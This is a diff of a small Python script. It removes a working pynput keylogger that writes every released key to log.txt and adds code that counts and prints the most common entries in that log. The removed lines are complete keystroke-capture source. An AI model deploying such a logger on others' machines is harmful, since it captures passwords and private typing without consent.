@@ -1,28 +1,16 @@
-from pynput.keyboard import Listener
-import logging
+from collections import Counter
 
-logging.basicConfig(filename='log.txt', level=logging.DEBUG, format='%(message)s')
+words_list = []
 
+with open('log.txt') as file:
+    # read all lines
+    data = file.readlines()
+    for line in data:
+        # append the line without \n char
+        words_list.append(line[:-1])
 
-# If you want to log each key in one line use this
-def last_char():
-    logging.StreamHandler.terminator = ''
+    # Count each item and sort them from most to least common order
+    count_table = Counter(words_list).most_common()
 
-
-# Shift, Enter etc. will log after releasing the key.
-# If you want to log them when it pressed change all on_release with on_pressed.
-def on_release(key):
-    if len(str(key)) == 3:
-        logging.info(str(key)[1:2])
-    elif 'Key.' in str(key):
-        logging.info(str(key)[4:])
-    else:
-        logging.info('')
-
-    # last_char()
-
-
-# last_char()
-
-with Listener(on_release=on_release) as listener:
-    listener.join()
+    for item in count_table:
+        print(str(item[0]) + ' : ' + str(item[1]))
